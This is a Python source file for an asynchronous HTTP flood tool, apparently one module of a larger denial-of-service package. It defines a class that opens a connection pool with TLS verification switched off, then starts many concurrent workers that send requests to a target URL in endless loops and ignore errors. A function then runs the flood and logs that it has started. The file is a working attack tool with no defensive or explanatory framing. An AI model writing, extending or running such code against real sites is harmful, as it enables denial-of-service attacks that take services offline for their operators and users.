import asyncio
import os
import ssl
from typing import Optional
from aiohttp import ClientSession, TCPConnector

from .headres import getHeaders

from contextlib import suppress
from ..utils.ulog import log

from ..src.cpu_manager import CPUManager
import sys
import time

MAX_LINE_LENGTH = 80
class HTTPFlooder:
    def __init__(
            self,
            target_url: str,
            concurrency: int,
            sleep_time: float,
            method: str
    ):
        self.target_url = target_url
        self.concurrency = concurrency
        self.sleep_time = sleep_time
        self.method = method

        self.session : Optional[ClientSession] = None
        self.ssl_context = self.create_ssl_context()


    def create_ssl_context(self) -> ssl.SSLContext:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        context.options |= ssl.OP_NO_COMPRESSION # ?
        return context


    async def __aenter__(self):
        headers = getHeaders(self.target_url)

        log.critical(f"Size headers: {sys.getsizeof(str(headers))} bytes")

        # time.sleep(2)
        await asyncio.sleep(2)
        connector = TCPConnector(
            limit=self.concurrency * 2,
            limit_per_host=self.concurrency,
            ssl=self.ssl_context,
            use_dns_cache=True,
            ttl_dns_cache=30,
            
            force_close=True,
            enable_cleanup_closed=True
            
        )


        self.session = ClientSession(
            headers=headers,
            connector=connector,
            trust_env=True,
        )
        return self
    

    async def __aexit__(self, 
                        exc_type,
                        exc_val,
                        exc_tb):
        if self.session:
            await self.session.close()


    # :)
    async def send_http_request(
            self,
            worker_id: int,
            sem: asyncio.Semaphore
    ) -> None:
        pid = os.getpid()

        method_name =  self.method.lower()
        method_func = getattr(self.session, method_name)
        worker_label = f"[Worker '{method_name}' {worker_id} | PID {pid}]"

        while True:
            async with sem:
                try:
                    if self.sleep_time > 0:
                        await asyncio.sleep(self.sleep_time)
                    if not self.session:
                        raise RuntimeError("HTTP session is not initialized.")      
                    
                    
                    async with method_func(
                            self.target_url, 
                            timeout=10,
                            ssl=self.ssl_context
                    ) as response:
                        await response.release()
                        status = response.status

                        if status >= 400:
                            print(f"{worker_label} Error: {status}")

                except asyncio.CancelledError:
                    break
                except Exception as e:
        
                    await asyncio.sleep(1)
                    continue

async def run_http_flood(
        target_url: str,
        concurrency: int,
        sleep_time: float,
        method: str = 'post'
) -> None:
    log.warning(f"Starting HTTP flood on {target_url} with {concurrency} workers.")

    CPUManager.randomize_cpu()


    async with HTTPFlooder(
        target_url,
        concurrency,
        sleep_time,
        method=method
    ) as flooder:
        sem = asyncio.Semaphore(concurrency)

        tasks = [
            asyncio.create_task(
                flooder.send_http_request(
                    worker_id=i,
                    sem=sem
                ),
                name=f"http_worker_{i}"
            )
            for i in range(concurrency)
        ]


        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except KeyboardInterrupt:
            log.warning("Received exit signal. Cancelling tasks...")
            for task in tasks:
                task.cancel()

            with suppress(
                asyncio.CancelledError
            ):
                await asyncio.gather(*tasks, return_exceptions=True)
